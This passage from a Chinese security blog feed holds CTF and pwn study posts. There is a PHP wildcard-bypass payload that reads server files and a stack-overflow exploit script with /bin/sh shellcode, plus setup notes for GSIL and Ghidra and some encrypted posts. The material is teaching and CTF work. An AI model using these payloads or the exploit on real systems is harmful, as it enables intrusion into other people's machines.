<li>*可以代替0个及以上任意字符</li>
<li>?可以代表1个任意字符</li>
</ul>
<p>可以使用?来代替字符：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;???&#x2F;??? &#x3D;&gt; &#x2F;bin&#x2F;cat</span><br></pre></td></tr></table></figure>
<p>用此来读取源码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$_&#x3D;&#96;&#x2F;???&#x2F;???%20&#x2F;???&#x2F;???&#x2F;????&#x2F;?????.???&#96;;?&gt;&lt;?&#x3D;$_?&gt;</span><br><span class="line">&quot;&#x2F;bin&#x2F;cat &#x2F;var&#x2F;www&#x2F;html&#x2F;index.php&quot;</span><br></pre></td></tr></table></figure>
<p>为保持长度小于35且不存在$_,则将$_带入后面一个表达式，同时使用*来匹配最后文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?&gt;&lt;?&#x3D;&#96;&#x2F;???&#x2F;???%20&#x2F;???&#x2F;???&#x2F;????&#x2F;*&#96;?&gt;</span><br></pre></td></tr></table></figure>
<p>php使用短链接，其含义如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php echo &#96;&#x2F;bin&#x2F;cat &#x2F;var&#x2F;www&#x2F;html&#x2F;index.php&#96;?&gt;</span><br></pre></td></tr></table></figure>
<p>读取到源码发现存在如下函数：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function getFlag()&#123;</span><br><span class="line">	$flag &#x3D; file_get_contents(&#39;&#x2F;flag&#39;);</span><br><span class="line">	echo $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最后直接读取flag文件。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?&gt;&lt;?&#x3D;&#96;&#x2F;???&#x2F;???%20&#x2F;????&#96;;?&gt;</span><br></pre></td></tr></table></figure>

<h2 id="0x04-其它思考"><a href="#0x04-其它思考" class="headerlink" title="0x04 其它思考"></a>0x04 其它思考</h2><p>windows中将if(preg_match(“/[A-Za-z0-9_$]+/“,$code))过滤修改，去除对大写字母或小写的过滤，由于windows对大小写不敏感，可以在windows系统中尝试执行任意代码<br><img src="/2018/10/11/CTF%E4%B8%80%E9%81%93web%E9%A2%98%E5%B0%8F%E7%BB%93-%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8DgetFlag/windows%E6%89%A7%E8%A1%8C%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81.PNG"></p>
<p>不对if(preg_match(“/[A-Za-z0-9_$]+/“,$code))进行修改，将whoami进行取反再url编码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">~%88%97%90%9E%92%96</span><br></pre></td></tr></table></figure>
<p>则失败。<br><img src="/2018/10/11/CTF%E4%B8%80%E9%81%93web%E9%A2%98%E5%B0%8F%E7%BB%93-%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8DgetFlag/windows%E7%BB%95%E8%BF%87%E5%A4%B1%E8%B4%A5.PNG"></p>
<p>去除[A-Za-z0-9_$]同样也无法执行代码，可见在windows中对命令进行位运算后会执行失败。</p>
<h2 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h2><p><a href="https://xz.aliyun.com/t/2597#toc-8">[红日安全]PHP-Audit-Labs题解之Day5-8</a><br><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">一些不包含数字和字母的webshell</a><br><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">无字母数字webshell之提高篇</a><br><a href="https://www.anquanke.com/post/id/154284">CTF题目思考–极限利用</a></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>PWN学习笔记1--入门</title>
    <url>/2018/12/12/PWN%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E5%85%A5%E9%97%A8/</url>
    <content><![CDATA[<h1 id="0x00-pwn介绍"><a href="#0x00-pwn介绍" class="headerlink" title="0x00 pwn介绍"></a>0x00 pwn介绍</h1><p>  PWN是指二进制漏洞的发掘和利用，CTF中PWN题目一般出现在linux平台上</p>
<a id="more"></a>
<h1 id="0x01-pwn所需的基础知识"><a href="#0x01-pwn所需的基础知识" class="headerlink" title="0x01 pwn所需的基础知识"></a>0x01 pwn所需的基础知识</h1><ul>
<li>c语言</li>
<li>汇编语言</li>
<li>Python</li>
<li>操作系统基础</li>
<li>linux基本命令</li>
</ul>
<h2 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h2><p>IP/EIP/RIP：指向当前的命令地址<br>SP/ESP/RSP：指向栈的顶部<br>BP/EBP/RBP：指向栈的底部</p>
<h2 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h2><p>一种后进先出的数据结构，用于调用函数过程中回复寄存器的状态。<br><img src="/2018/12/12/PWN%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E5%85%A5%E9%97%A8/%E6%A0%88.PNG"></p>
<h2 id="大端与小端模式"><a href="#大端与小端模式" class="headerlink" title="大端与小端模式"></a>大端与小端模式</h2><p>以0x12345678为例（从左到右代表地址从低到高）</p>
<ul>
<li>小端 \x78\x56\x34\x12</li>
<li>大端 \x12\x34\x56\x78</li>
</ul>
<p>大端模式：PowerPC、IBM、Sun、大部分网络协议<br>小端模式：X86、DEC</p>
<h1 id="0x02-栈溢出"><a href="#0x02-栈溢出" class="headerlink" title="0x02 栈溢出"></a>0x02 栈溢出</h1><p>栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致栈中与其相邻的变量的值被改变。这种问题是一种特定的缓冲区溢出漏洞。<br>发生栈溢出的基本前提是：</p>
<ul>
<li>程序必须向栈上写入数据</li>
<li>写入的数据大小没有被良好地控制</li>
</ul>
<h1 id="0x03-参考"><a href="#0x03-参考" class="headerlink" title="0x03 参考"></a>0x03 参考</h1><p><a href="https://zhuanlan.zhihu.com/p/34665623">从零开始学CTF</a></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>GSIL配置使用--GitHub敏感信息泄露监控</title>
    <url>/2019/01/22/GSIL%E9%85%8D%E7%BD%AE%E4%BD%BF%E7%94%A8-GitHub%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E7%9B%91%E6%8E%A7/</url>
    <content><![CDATA[<h1 id="0x01-GSIL介绍"><a href="#0x01-GSIL介绍" class="headerlink" title="0x01 GSIL介绍"></a>0x01 GSIL介绍</h1><p>GSIL全称GitHub Sensitive Information Leakage（GitHub敏感信息泄露监控）。<br>功能：</p>
<ul>
<li>根据rules.gsil规则匹配GitHub内容</li>
<li>通过邮件告警</li>
<li>设置计划任务，定期扫描</li>
</ul>
<p><strong>GSIL项目主页：</strong><br><a href="https://github.com/FeeiCN/GSIL">GSIL</a></p>
<a id="more"></a>

<h1 id="0x02-GSIL安装配置"><a href="#0x02-GSIL安装配置" class="headerlink" title="0x02 GSIL安装配置"></a>0x02 GSIL安装配置</h1><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>使用python3进行安装,由于同时存在python2，因此使用python3，pip3来调用。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/FeeiCN/gsil.git</span><br><span class="line"><span class="built_in">cd</span> gsil/</span><br><span class="line">pip3 install -r requirements.txt</span><br></pre></td></tr></table></figure>

<h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>拷贝config.gsil.example为config.gsil，根据README-zh.md指导，配置参考如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[mail]</span><br><span class="line">host : smtp.exmail.qq.com</span><br><span class="line"># SMTP端口(非SSL端口，但会使用TLS加密)</span><br><span class="line">port : 25</span><br><span class="line"># 多个发件人使用逗号(,)分隔</span><br><span class="line">mails : gsil@feei.cn</span><br><span class="line">from : GSIL</span><br><span class="line">password : your_password</span><br><span class="line"># 多个收件人使用逗号(,)分隔</span><br><span class="line">to : feei@feei.cn</span><br><span class="line"></span><br><span class="line">[github]</span><br><span class="line"># 扫描到的漏洞仓库是否立刻Clone到本地（~&#x2F;.gsil&#x2F;codes&#x2F;）</span><br><span class="line"># 此选项用作监控其它厂商，避免因为仓库所有者发现后被删除</span><br><span class="line">clone: false</span><br><span class="line"></span><br><span class="line"># GitHub Token用来调用相关API，多个Token使用逗号(,)分隔</span><br><span class="line"># https:&#x2F;&#x2F;github.com&#x2F;settings&#x2F;tokens</span><br><span class="line">tokens : your_token</span><br></pre></td></tr></table></figure>
<ol>
<li><p>mail设置部分<br>查看qq邮箱smtp服务器，如下：<br><img src="/2019/01/22/GSIL%E9%85%8D%E7%BD%AE%E4%BD%BF%E7%94%A8-GitHub%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E7%9B%91%E6%8E%A7/QQ%E9%82%AE%E7%AE%B1%E6%9C%8D%E5%8A%A1%E5%99%A8.PNG"></p>
<p>修改host为smtp.qq.com,port为465。</p>
<p>mails填写自己QQ邮箱，<em>注意</em>，此处password并非填写QQ邮箱密码，需要填写QQ邮箱授权码，<a href="https://service.mail.qq.com/cgi-bin/help?subtype=1&&id=28&&no=1001256">授权码获取流程</a>：</p>
<p>进入设置－》帐户页面找到如下页面：<br><img src="/2019/01/22/GSIL%E9%85%8D%E7%BD%AE%E4%BD%BF%E7%94%A8-GitHub%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E7%9B%91%E6%8E%A7/%E5%BC%80%E5%90%AFQQ%E9%82%AE%E7%AE%B1SMTP%E6%9C%8D%E5%8A%A1.PNG"></p>
<p>点击开启POP3/SMTP服务，进行密保验证：<br><img src="/2019/01/22/GSIL%E9%85%8D%E7%BD%AE%E4%BD%BF%E7%94%A8-GitHub%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E7%9B%91%E6%8E%A7/%E5%AF%86%E4%BF%9D%E9%AA%8C%E8%AF%81.PNG"></p>
<p>获取授权码后填入password中。</p>
<p>最后需要在“to : <a href="mailto:&#102;&#101;&#x65;&#105;&#x40;&#x66;&#101;&#x65;&#x69;&#46;&#x63;&#110;">&#102;&#101;&#x65;&#105;&#x40;&#x66;&#101;&#x65;&#x69;&#46;&#x63;&#110;</a>”下一行添加“cc ：<a href="mailto:&#102;&#x65;&#x65;&#x69;&#x40;&#102;&#101;&#x65;&#x69;&#46;&#x63;&#x6e;">&#102;&#x65;&#x65;&#x69;&#x40;&#102;&#101;&#x65;&#x69;&#46;&#x63;&#x6e;</a>”抄送邮箱，不然后面运行会报错。</p>
</li>
<li><p>GitHub设置部分<br>登录GitHub账号，设置tokens的页面说明文档已经给出：<br><a href="https://github.com/settings/tokens">https://github.com/settings/tokens</a></p>
<p>点击Generate new token，出现如下页面：<br><img src="/2019/01/22/GSIL%E9%85%8D%E7%BD%AE%E4%BD%BF%E7%94%A8-GitHub%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E7%9B%91%E6%8E%A7/token.PNG"></p>
<p>填写token的描述，本人只勾选了repo下的public_repo。保存后出现如下信息：<br><img src="/2019/01/22/GSIL%E9%85%8D%E7%BD%AE%E4%BD%BF%E7%94%A8-GitHub%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E7%9B%91%E6%8E%A7/token%E4%BF%A1%E6%81%AF.PNG"></p>
<p>注意保存下token，token只显示一次，后续再登录无法重新获取。填入tokens中。配置结束。</p>
</li>
</ol>
<h1 id="GSIL使用"><a href="#GSIL使用" class="headerlink" title="GSIL使用"></a>GSIL使用</h1><p>根据示例文件配置好rules.gsil规则，使用如下命令进行测试：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 gsil.py --verify-tokens</span><br></pre></td></tr></table></figure>
<p>成功执行<br><img src="/2019/01/22/GSIL%E9%85%8D%E7%BD%AE%E4%BD%BF%E7%94%A8-GitHub%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E7%9B%91%E6%8E%A7/gsil%E6%B5%8B%E8%AF%95.PNG"></p>
<p>其他运行方式具体查看README-zh.md文档。</p>
]]></content>
      <categories>
        <category>工具使用</category>
      </categories>
      <tags>
        <tag>信息泄露</tag>
      </tags>
  </entry>
  <entry>
    <title>PWN学习笔记2--堆栈的缓冲区溢出</title>
    <url>/2019/01/15/PWN%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E5%A0%86%E6%A0%88%E7%9A%84%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/</url>
    <content><![CDATA[<h1 id="缓冲区溢出"><a href="#缓冲区溢出" class="headerlink" title="缓冲区溢出"></a>缓冲区溢出</h1><p>缓冲区溢出有两种类型：</p>
<ol>
<li>基于栈的缓冲区溢出</li>
<li>基于堆的缓冲区溢出</li>
</ol>
<p>缓冲区溢出可导致任意代码执行！<br>任意代码执行允许攻击者执行其代码以获取受害者机器的控制权，获取shell，添加新用户，打开端口等……</p>
<a id="more"></a>
<h1 id="栈溢出示例"><a href="#栈溢出示例" class="headerlink" title="栈溢出示例"></a>栈溢出示例</h1><h2 id="易受攻击的代码"><a href="#易受攻击的代码" class="headerlink" title="易受攻击的代码"></a>易受攻击的代码</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//vuln.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span> </span>&#123;</span><br><span class="line">        <span class="comment">/* [1] */</span> <span class="keyword">char</span> buf[<span class="number">256</span>];</span><br><span class="line">        <span class="comment">/* [2] */</span> <span class="built_in">strcpy</span>(buf,argv[<span class="number">1</span>]);</span><br><span class="line">        <span class="comment">/* [3] */</span> <span class="built_in">printf</span>(<span class="string">&quot;Input:%s\n&quot;</span>,buf);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>gcc编译</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#关闭ASLR（地址空间布局随机化）</span></span><br><span class="line">sudo <span class="built_in">echo</span> 0 &gt; /proc/sys/kernel/randomize_va_space</span><br><span class="line">gcc -g -fno-stack-protector -z execstack -o vuln vuln.c</span><br><span class="line"><span class="comment">#添加执行权限</span></span><br><span class="line">sudo chown root vuln</span><br><span class="line">sudo chgrp root vuln</span><br><span class="line">sudo chmod +s vuln     </span><br></pre></td></tr></table></figure>

<p>从上述代码可以看出，第[2]行代码存在缓冲区溢出，可导致任意代码执行。</p>
<h2 id="反编译"><a href="#反编译" class="headerlink" title="反编译"></a>反编译</h2><p>使用gdb编译<br><img src="/2019/01/15/PWN%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E5%A0%86%E6%A0%88%E7%9A%84%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/%E5%8F%8D%E7%BC%96%E8%AF%91.PNG"></p>
<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>当输入大小超过256时会溢出缓冲区并覆盖栈中的返回地址。通过输入“A” * 268 + “B” * 4测试。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ gdb -q vuln</span><br><span class="line">Reading symbols from &#x2F;home&#x2F;sploitfun&#x2F;lsploits&#x2F;new&#x2F;csof&#x2F;vuln...done.</span><br><span class="line">(gdb) r &#96;python -c &#39;print &quot;A&quot;*268 + &quot;B&quot;*4&#39;&#96;</span><br><span class="line">Starting program: &#x2F;home&#x2F;sploitfun&#x2F;lsploits&#x2F;new&#x2F;csof&#x2F;vuln &#96;python -c &#39;print &quot;A&quot;*268 + &quot;B&quot;*4&#39;&#96;</span><br><span class="line">Input:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB</span><br><span class="line"></span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">0x42424242 in ?? ()</span><br><span class="line">(gdb) p&#x2F;x $eip</span><br><span class="line">$1 &#x3D; 0x42424242</span><br><span class="line">(gdb)</span><br></pre></td></tr></table></figure>
<p>输出显示寄存器eip被“BBBB”覆盖。</p>
<ul>
<li>0x8 is alignment space</li>
<li>0x4 is caller’s EBP<br>268=256+8+4</li>
</ul>
<h2 id="Poc"><a href="#Poc" class="headerlink" title="Poc"></a>Poc</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#exp.py</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> call</span><br><span class="line"></span><br><span class="line"><span class="comment">#Stack address where shellcode is copied.</span></span><br><span class="line">ret_addr = <span class="number">0xbffff1d0</span>       </span><br><span class="line"></span><br><span class="line"><span class="comment">#Spawn a shell</span></span><br><span class="line"><span class="comment">#execve(/bin/sh)</span></span><br><span class="line">scode = <span class="string">&quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#endianess convertion</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">conv</span>(<span class="params">num</span>):</span></span><br><span class="line"> <span class="keyword">return</span> struct.pack(<span class="string">&quot;&lt;I&quot;</span>,num</span><br><span class="line"></span><br><span class="line"><span class="comment"># buf = Junk + RA + NOP&#x27;s + Shellcode</span></span><br><span class="line">buf = <span class="string">&quot;A&quot;</span> * <span class="number">268</span></span><br><span class="line">buf += conv(ret_addr)</span><br><span class="line">buf += <span class="string">&quot;\x90&quot;</span> * <span class="number">100</span></span><br><span class="line">buf += scode</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;Calling vulnerable program&quot;</span></span><br><span class="line">call([<span class="string">&quot;./vuln&quot;</span>, buf])</span><br></pre></td></tr></table></figure>

<h1 id="英文原文"><a href="#英文原文" class="headerlink" title="英文原文"></a>英文原文</h1><p><a href="https://sploitfun.wordpress.com/2015/05/08/classic-stack-based-buffer-overflow/">Classic Stack Based Buffer Overflow</a></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>Redis未授权访问</title>
    <url>/2019/02/27/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="密码错误，请重试。" data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="" />
    <label for="hbePass">输入密码，查看文章。</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="5a59cf1df51fce09779b20ddac99918d7fd2462ede9a53c16177f2f1406bc936"></script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title>NSA逆向工具--Ghidra安装及漏洞修复</title>
    <url>/2019/03/07/NSA%E9%80%86%E5%90%91%E5%B7%A5%E5%85%B7-Ghidra%E5%AE%89%E8%A3%85%E5%8F%8A%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D/</url>
    <content><![CDATA[<h1 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h1><p>2019年RSA安全大会上，美国国家安全局（NSA）公布了一款名叫Ghidra的逆向工程工具。Ghidra使用Java编写，具有图形界面，可在Windows，Mac和Linux上运行。</p>
<p><strong>Ghidra官网地址：</strong><a href="https://ghidra-sre.org/">https://ghidra-sre.org/</a><br>注：屏蔽了部分国家IP地址，方法大家都懂。。。</p>
<a id="more"></a>

<h1 id="0x02-安装环境"><a href="#0x02-安装环境" class="headerlink" title="0x02 安装环境"></a>0x02 安装环境</h1><h2 id="平台支持"><a href="#平台支持" class="headerlink" title="平台支持"></a>平台支持</h2><ul>
<li>Microsoft Windows 7 or 10 (64位)</li>
<li>Linux （64位，推荐使用CentOS 7）</li>
<li>macOS (OS X) 10.8.3+（Mountain Lion或更高版本）</li>
<li>*注意：** 不推荐使用32位操作系统<br>（本人使用64位的CentOS 7）</li>
</ul>
<h2 id="最低要求"><a href="#最低要求" class="headerlink" title="最低要求"></a>最低要求</h2><h3 id="硬件"><a href="#硬件" class="headerlink" title="硬件"></a>硬件</h3><ul>
<li>4 GB RAM</li>
<li>1 GB storage</li>
</ul>
<h3 id="软件"><a href="#软件" class="headerlink" title="软件"></a>软件</h3><ul>
<li>JDK 11 或更高版本<br>（推荐使用OpenJDK，地址：<a href="http://jdk.java.net/">jdk.java.net</a>，本人使用JDK 11.0.2版本。）</li>
</ul>
<h1 id="0x03-安装步骤"><a href="#0x03-安装步骤" class="headerlink" title="0x03 安装步骤"></a>0x03 安装步骤</h1><p>解压jdk到本地</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">tar -zxvf openjdk-11.0.2_linux-x64_bin.tar.gz</span><br></pre></td></tr></table></figure>
<p><img src="/2019/03/07/NSA%E9%80%86%E5%90%91%E5%B7%A5%E5%85%B7-Ghidra%E5%AE%89%E8%A3%85%E5%8F%8A%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D/OpenJDK.png"></p>
<p>将JDK bin目录添加到PATH环境变量。当然我们可以指定Ghidra使用指定的Java启动（在support / launch.properties文件中设置JAVA_HOME_OVERRIDE属性），当Java版本不兼容时，Ghidra会自动查找兼容版本。</p>
<p>解压Ghidra到本地，进入文件夹，运行ghidraRun，即可打开Ghidra</p>
<p><img src="/2019/03/07/NSA%E9%80%86%E5%90%91%E5%B7%A5%E5%85%B7-Ghidra%E5%AE%89%E8%A3%85%E5%8F%8A%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D/Ghidra.png"></p>
<h1 id="0x04-bugdoor修复"><a href="#0x04-bugdoor修复" class="headerlink" title="0x04 bugdoor修复"></a>0x04 bugdoor修复</h1><h2 id="漏洞说明"><a href="#漏洞说明" class="headerlink" title="漏洞说明"></a>漏洞说明</h2><p>工具发布后，Matthew Hickey报告了一个安全问题，在调试模式下运行套件时，会向网络打开18001端口，接受任何可以连接的机器的远程命令。</p>
<p><img src="/2019/03/07/NSA%E9%80%86%E5%90%91%E5%B7%A5%E5%85%B7-Ghidra%E5%AE%89%E8%A3%85%E5%8F%8A%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D/%E6%BC%8F%E6%B4%9E.PNG"></p>
<h2 id="修复方法"><a href="#修复方法" class="headerlink" title="修复方法"></a>修复方法</h2><p>打开support目录下的launch.sh文件，找到150行代码，将*修改为127.0.0.1，仅监听本机的调试连接，而不是通过网络监听任何主机。</p>
<p><img src="/2019/03/07/NSA%E9%80%86%E5%90%91%E5%B7%A5%E5%85%B7-Ghidra%E5%AE%89%E8%A3%85%E5%8F%8A%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D/%E4%BF%AE%E5%A4%8D.png"></p>
<h1 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h1><p><a href="https://ghidra-sre.org/InstallationGuide.html">Ghidra Installation Guide</a></p>
]]></content>
      <categories>
        <category>工具使用</category>
      </categories>
      <tags>
        <tag>逆向</tag>
      </tags>
  </entry>
  <entry>
    <title>任意用户密码重置</title>
    <url>/2019/04/28/%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="密码错误，请重试。" data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="" />
    <label for="hbePass">输入密码，查看文章。</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="47edb8aae6808db9b758024a08cf17fbd93bc9f1ede685a647377fe8bd092d46">a0c75c8d75e1ac906489f75c7391f8dab563c6e3d9d92740bc0fb5b4a1798c9104febd470a64ff880f0a2d482be0fc7316aae6a77a5d377943df79583b59baa51eea6c9f94f6553b9d6f616110eac7310a4f398ca6201d18dd937b7199259db0640de663c987714b8d01d8c3c74f31610813e7041821e7e9afcabc76f1a1d2936d3077a0b101939fb009637a5207bd37d304c03387372f2f3d049f798a7cec365d3e3a7514613789360b11d3f156a46fe27f14b20be432886c06e3592507f28395b113b60085f13b4b705679fa00d0b5e6843de9db97769d81282242b00a2ca582286b5794a129dbd8e4d2ea5e97b31d4c3e04992774dfeacfbfc9096104b1b24d05541a5a14274d93a93d60941288e142e72db3f57e33e140779c37dadb9ff7d71f09f0746be754296a051ebc6ed75591a21aa0be3ad7df1842cfc9cb599502d48062457f561c9522646471bceb76989f4ee8aa4013751134268cd37955002a6287d8be255846578005a741e6b99aa9d9a1b22452cb7e4b91dafff4f59c11abcafea6441a55b6c9a00a1d0f2cee2bb58d7790ee104ab19eab831a08f37ee1ca3170cc6eed47bc8109ca5e56fa5f4bbcbc74e4d93c00aec75e3ddf3e78c6b1f045cab07abb31bd81abeb719bfce5010d65289e9f27be136b6bf6ef92da9f92637587e705744941e58d70ae879076071c9aeba04b1a2683cec5808d62154da157134eb0414484f1ab8e2036508c91d4fc3ef49c1338494661cee91aafc3dddee9333a818844eb93695986a3e05bfadd69e82c8d9c51fae29f75ea584b7983be5c82257de01d8b3882ed90e2fbf55a83cad429cf557855a20228849aa4d8e8f519661c1da19265e062992e34f55be8cb89967a089c5678f087f5732decdf9aefe0f2756651424b7085bc16ab212792ce05c47ad11caadd5bb68ed35b1ddbd88363851eb9eb1f4dbace1bd5620dcf2cb84ee4b1a63c1dfdb672db83dd7f16ad4a33d62b6ec96d18754512a3e00ebffb5d7c7172d96f3d409c2eb152118275fb83ef53b832bcbc41396c40e9829b013c3acbcf80cd65b1f82afb5ee8e42f84f5baf82dce9c7e8070d77051ba73931e98ef3d17dede0c9387695c7137633fd836e355477bcb4cfe1a4e41f29a962d4ff29b7c275ee7bcf427abe05fb1f6dd7718389a056fec6d2f9c13abc1671bd48c5489ce74522b9fcfcab7ff17a83eaf1163a8526a3426bbbe875e6ef7cece93eccefe6c47d8733edff0165b5e90d7da486cfebd1f9f9d5a6817520adf687ebb2bfa0cb45ce0cccff9cc297389b40d772a86f806cbfb96c929fad534c50d570ca909df84f79cb60609ffee0c090f9f2d05520bbab87a1622a975c751f9364e45400d0669f03606d9f59689e81e652c0c59346b96a027c217f7869e70f1466a3c14bd64d4dd55f31a08fc2e0ebaca56b5468db4ff8d2df96c5d82dd67202cdf59919ae5119a60bfd41aa41d1453ee55fcaa1ab1bac1c7fc15a49a7bf3e90f0bf1e34a8a01cf983ddf58bfa441baca321f6d2a8eaf2b08d72dc38e69222a8e0346b309d2879df1c455edaf7e17218207acff5511e71042d15d09d271747ea5f1300223b10b2f7b290c0247a2d5170fdf84145337c1cffc0dbd329ade45943043bd769315d4b2584b7ace1acf051ba7ce8f8847bbfe40ec394b9d82580fbc5034a4cba8810aa7ca80c7eb9e4083492013cd052fda01e6d2af63f5d509e5f321a62c162472c9d1aed8e01bf806a417edf2e8c2dbdffd16a0c024adb5556a3850de673ccd6895ab4eea5b2925ffa262088a041811a492ffdd364cb73d123afb0d92db3870aa20f70a59ab1eb8692428f41675daa21c1c109ae5b66487d8a3a2164e9252de50e78437d3e73282978609e60d00540802c08bc2054522028afdfadb733b15c77f234374398361bee825d4128d17140585cd5d4e272cc36e01776cb390c28bbaa1231b5dbb8301d2445b1f733222b0e44db1c4297f6bbd619b6e980066ef5382dbae24bfea74b4a53b40d060a1e53a8d8c49c66eb2f647af26e993342a08dc8629c6e1c9084db822ef81e23394e5f037709455ea53bf0d50e9d971cc95dc9cd7e4969e6432220de1d494e89a49c2e705a31021a5b31dcab01d63879393e916582026815225fc0098b2b22412f8654ffadbca7b1a9469c52285d078cbf5cd602cd055349d0d4b554398fd64e36631e46b75e827b32106a601819c31c26bfe1243d9f551171fc640730b73a7562f9ee665936a5cef0c6cccc2481dc0ed4d644856b9669bf0ab76998487524141426871595517943452bab7622845cbbf6538eafc7c7fef30ea8df8f7201ea2fefa366e4c539f4167ec9804ef9263876c49ea